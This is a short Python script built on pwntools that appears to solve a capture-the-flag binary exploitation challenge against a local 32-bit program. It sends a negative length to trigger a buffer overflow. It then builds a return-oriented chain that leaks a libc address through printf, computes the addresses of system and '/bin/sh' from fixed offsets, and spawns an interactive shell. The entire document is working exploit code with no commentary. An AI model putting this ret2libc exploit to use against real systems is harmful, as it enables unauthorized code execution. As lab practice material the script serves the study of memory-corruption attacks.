from pwn import *

io=process('./pwn')
vul=0x804852F
print_plt=0x8048370
start_main=0x804A018

io.recvuntil('to read?')
io.sendline('-1')
io.recvuntil('data!\n')
io.sendline('a'*0x2c+'bbbb'+p32(print_plt)+p32(vul)+p32(start_main))
io.recvuntil('\xa0')
io.recvline()
start_main=u32(io.recv(4))
print(hex(start_main))
system=start_main+0x22400
sh=start_main+0x140aeb
io.sendline('-1')
io.sendline('a'*0x2c+'bbbb'+p32(system)+'dead'+p32(sh))

io.interactive()